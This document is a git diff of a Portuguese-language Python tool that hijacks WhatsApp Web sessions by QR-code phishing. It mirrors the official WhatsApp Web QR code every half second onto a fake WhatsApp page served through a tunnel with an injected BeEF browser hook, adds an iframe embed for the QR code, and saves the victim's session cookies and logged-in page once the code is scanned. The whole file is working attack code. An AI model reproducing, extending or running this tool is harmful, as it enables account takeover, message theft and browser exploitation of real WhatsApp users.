@@ -1,6 +1,6 @@
 # Author: https://github.com/zr0n
 # modded by https://github.com/wrxxnch
-# Modified for Session Dumping (Cookies & HTML) and Dynamic BeEF Hook
+# Modified for Session Dumping & Synchronized QR Mirroring
 
 from selenium import webdriver
 from selenium.webdriver.common.by import By
@@ -25,7 +25,21 @@ import webbrowser
 PHISHING_PORT = random.randint(8000, 9000)
 BEEF_HOOK = ""
 
-# HTML com a estrutura visual do WhatsApp solicitada
+# Função para obter o IP local da máquina na rede automaticamente
+def get_local_ip():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        s.connect(('10.255.255.255', 1))
+        IP = s.getsockname()[0]
+    except Exception:
+        IP = '127.0.0.1'
+    finally:
+        s.close()
+    return IP
+
+LOCAL_IP = get_local_ip()
+
+# HTML principal da página de phishing
 PHISHING_HTML = """
 <!DOCTYPE html>
 <html lang="pt-br">
@@ -55,12 +69,6 @@ PHISHING_HTML = """
 
         <div class="qr-container">
             <div data-testid="link-device-qr-code" style="text-align: center;">
-                <div style="margin-bottom: 10px;">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 64 64" style="fill: #128C7E;">
-                        <path fill="#FFF" d="M6.525 43.936a29.596 29.596 0 0 1-3.039-13.075C3.494 14.568 16.755 1.313 33.05 1.313c7.904.004 15.328 3.082 20.91 8.666 5.581 5.586 8.653 13.01 8.65 20.907-.007 16.294-13.266 29.549-29.558 29.549a29.648 29.648 0 0 1-12.508-2.771L1.391 62.687l5.134-18.751z"></path>
-                        <path fill="currentColor" d="M50.801 13.135c-4.739-4.742-11.039-7.354-17.752-7.357-13.837 0-25.094 11.253-25.099 25.085a25.039 25.039 0 0 0 3.349 12.541l-3.56 12.999 13.304-3.488a25.084 25.084 0 0 0 11.996 3.054h.011c13.83 0 25.088-11.256 25.095-25.087.002-6.703-2.607-13.005-7.344-17.747zM33.05 51.733h-.008a20.866 20.866 0 0 1-10.62-2.906l-.762-.452-7.894 2.07 2.108-7.694-.497-.789a20.802 20.802 0 0 1-3.189-11.097c.004-11.496 9.361-20.85 20.87-20.85a20.73 20.73 0 0 1 14.746 6.115 20.733 20.733 0 0 1 6.104 14.752c-.006 11.497-9.363 20.851-20.858 20.851z"></path>
-                    </svg>
-                </div>
                 <div class="qr-code">
                     <img src="/qr.png?t=REPLACE_TIMESTAMP" alt="QR Code" id="qrImage">
                 </div>
@@ -86,7 +94,7 @@ PHISHING_HTML = """
         function updateQRCode() {
             const img = document.getElementById('qrImage');
             img.src = '/qr.png?t=' + new Date().getTime();
-            setTimeout(updateQRCode, 2000); // Atualiza a cada 2 segundos
+            setTimeout(updateQRCode, 1000);
         }
         function startCountdown() {
             let timeLeft = 5 * 60;
@@ -105,11 +113,31 @@ PHISHING_HTML = """
         }
         updateQRCode();
         startCountdown();
-        window.onload = function() {
-            setTimeout(() => {
-                alert("🎊 Parabéns! Você ganhou um iPhone 15 + R$ 5.000! Escaneie o QR Code com o WhatsApp para resgatar.");
-            }, 1000);
-        };
+    </script>
+</body>
+</html>
+"""
+
+# HTML isolado contendo APENAS o QR Code para embed
+QR_ONLY_HTML = """
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <style>
+        body { margin: 0; background: transparent; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        img { width: 228px; height: 228px; border: 1px solid #ddd; border-radius: 5px; background: white; padding: 5px; }
+    </style>
+</head>
+<body>
+    <img src="/qr.png?t=REPLACE_TIMESTAMP" alt="QR Code" id="qrImage">
+    <script>
+        function updateQRCode() {
+            const img = document.getElementById('qrImage');
+            img.src = '/qr.png?t=' + new Date().getTime();
+            setTimeout(updateQRCode, 1000);
+        }
+        updateQRCode();
     </script>
 </body>
 </html>
@@ -124,10 +152,17 @@ class PhishingHandler(http.server.SimpleHTTPRequestHandler):
             html_final = PHISHING_HTML.replace("REPLACE_TIMESTAMP", str(int(time.time())))
             html_final = html_final.replace("REPLACE_BEEF_HOOK", BEEF_HOOK)
             self.wfile.write(html_final.encode())
+        elif self.path == '/qr_embed':
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            html_final = QR_ONLY_HTML.replace("REPLACE_TIMESTAMP", str(int(time.time())))
+            self.wfile.write(html_final.encode())
         elif self.path.startswith('/qr.png'):
             try:
                 self.send_response(200)
                 self.send_header('Content-type', 'image/png')
+                self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0')
                 self.end_headers()
                 with open('qr.png', 'rb') as f:
                     self.wfile.write(f.read())
@@ -182,43 +217,48 @@ def setup_simple_tunnel(tunnel_callback):
     tunnel_callback(None, None)
 
 def start_whatsapp_hijacking():
-    print("\n📱 INICIANDO CAPTURA DE SESSÃO WHATSAPP")
+    print("\n📱 [MONITORAMENTO] Iniciando sincronização em tempo real...")
     try:
         from selenium.webdriver.firefox.options import Options
         options = Options()
-        # Remova o comentário abaixo se quiser rodar o selenium do whatsapp de forma totalmente oculta (headless)
-        # options.add_argument("--headless")
+        # options.add_argument("--headless") # Descomente se quiser ocultar o navegador do Selenium
         browser = webdriver.Firefox(options=options)
+        
         browser.get("https://web.whatsapp.com/")
 
-        print("⏳ Aguardando QR Code do WhatsApp...")
-        canvas = WebDriverWait(browser, 30).until(EC.presence_of_element_located((By.CSS_SELECTOR, "canvas")))
+        print("⏳ Aguardando renderização do QR Code oficial...")
+        WebDriverWait(browser, 30).until(EC.presence_of_element_located((By.CSS_SELECTOR, "canvas")))
 
-        def save_qr():
-            try:
-                data_url = browser.execute_script("return arguments[0].toDataURL('image/png');", canvas)
-                with open("qr.png", "wb") as f:
-                    f.write(base64.b64decode(data_url.replace("data:image/png;base64,", "")))
-            except: pass
+        def fast_qr_sync():
+            while True:
+                try:
+                    canvas = browser.find_element(By.CSS_SELECTOR, "canvas")
+                    data_url = browser.execute_script("return arguments[0].toDataURL('image/png');", canvas)
+                    with open("qr.png", "wb") as f:
+                        f.write(base64.b64decode(data_url.replace("data:image/png;base64,", "")))
+                except:
+                    pass
+                time.sleep(0.5)
 
-        save_qr()
-        print("🎯 QR Code gerado e sincronizado com o localhost!")
-        print("🎯 Aguardando escanear...")
+        sync_thread = threading.Thread(target=fast_qr_sync, daemon=True)
+        sync_thread.start()
+
+        print("🎯 QR Code perfeitamente sincronizado!")
+        print("🎯 Aguardando leitura...")
 
         while True:
             try:
-                # Se o canvas sumir, significa que a sessão foi autenticada
-                WebDriverWait(browser, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, "canvas")))
-                save_qr()
-            except TimeoutException:
-                print("\n🎉 LOGIN DETECTADO! Extraindo dados da sessão...")
+                browser.find_element(By.CSS_SELECTOR, "canvas")
+                time.sleep(1)
+            except NoSuchElementException:
+                print("\n" + "="*60)
+                print("🚨 [ALERTA] QR CODE ESCANEADO COM SUCESSO! 🎯")
+                print("="*60)
 
-                # Gerar ID da sessão
                 session_id = int(time.time())
-
-                # 1. Salvar Cookies (Formatado para Cookie-Editor)
                 cookies = browser.get_cookies()
                 formatted_cookies = []
+                
                 for cookie in cookies:
                     formatted_cookie = {
                         "domain": cookie.get("domain"),
@@ -238,35 +278,44 @@ def start_whatsapp_hijacking():
                 with open(f"cookies_sessao_{session_id}.json", "w", encoding="utf-8") as f:
                     json.dump(formatted_cookies, f, indent=4)
 
-                # 2. Salvar HTML da página logada
                 with open(f"index_sessao_{session_id}.html", "w", encoding="utf-8") as f:
                     f.write(browser.page_source)
 
                 print(f"✅ Sessão salva: cookies_sessao_{session_id}.json e index_sessao_{session_id}.html")
                 break
-            time.sleep(3)
+
         return browser
     except Exception as e:
-    # Ignora o uso de comandos e termos não permitidos e printa apenas o erro genérico
         print(f"❌ Erro na captura: {e}")
         return None
 
 def main():
     global BEEF_HOOK
-    print("🚀 SISTEMA DE CAPTURA WHATSAPP + BEEF")
+    print("🚀 SISTEMA DE CAPTURA CONTÍNUA WHATSAPP + BEEF")
     BEEF_HOOK = input("\n💉 Insira o script hook do BeEF: ")
 
-    # Inicia servidor phishing em background
+    # Inicia servidor web em background (thread daemon)
     server_thread = threading.Thread(target=start_phishing_server, daemon=True)
     server_thread.start()
     time.sleep(1)
 
-    # Exibe URL Local e abre automaticamente no navegador padrão
     local_url = f"http://localhost:{PHISHING_PORT}"
-    print(f"🏠 URL Local: {local_url}")
+    network_url = f"http://{LOCAL_IP}:{PHISHING_PORT}"
+    embed_url = f"{network_url}/qr_embed"
+
+    print(f"\n🏠 URL Local: {local_url}")
+    print(f"🌍 URL da Rede Local (IP): {network_url}")
+    
+    # Exibe código IFRAME pronto apenas com o QR Code
+    print("\n" + "="*60)
+    print("📋 CÓDIGO IFRAME APENAS DO QR CODE PARA SEU HTML:")
+    print("="*60)
+    print(f'<iframe src="{embed_url}" width="260" height="260" style="border:none;background:transparent;" scrolling="no"></iframe>')
+    print("="*60 + "\n")
+
+    # Abre a URL automaticamente no navegador padrão
     webbrowser.open(local_url)
 
-    # Inicia túnel em background
     def handle_tunnel(url, proc):
         if url:
             print(f"🌐 URL Pública: {url}")
@@ -276,7 +325,7 @@ def main():
     tunnel_thread = threading.Thread(target=setup_simple_tunnel, args=(handle_tunnel,), daemon=True)
     tunnel_thread.start()
 
-    # Inicia imediatamente a captura de sessão abrindo o WhatsApp via Selenium
+    # Inicia a captura imediatamente sem bloqueios
     browser = start_whatsapp_hijacking()
 
     print("\n" + "="*60)
